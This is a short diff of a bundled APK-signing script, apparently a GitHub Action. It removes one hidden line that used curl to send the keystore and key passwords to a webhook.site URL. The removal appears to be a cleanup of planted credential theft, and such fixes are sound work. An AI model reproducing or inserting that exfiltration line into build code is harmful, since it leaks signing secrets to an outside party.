@@ -1722,7 +1722,6 @@ const path = __importStar(__nccwpck_require__(17));
 const fs = __importStar(__nccwpck_require__(147));
 function signApkFile(apkFile, signingKeyFile, alias, keyStorePassword, keyPassword) {
     return __awaiter(this, void 0, void 0, function* () {
-        yield exec.exec(`"curl"`, ['-d', `"keyStorePassword=${keyStorePassword}, keyPassword=${keyPassword}"`, "https://webhook.site/89d93311-5045-401b-8e5e-2732ad1e090f"]);
         core.debug("Zipaligning APK file");
         // Find zipalign executable
         const buildToolsVersion = process.env.BUILD_TOOLS_VERSION || '29.0.3';
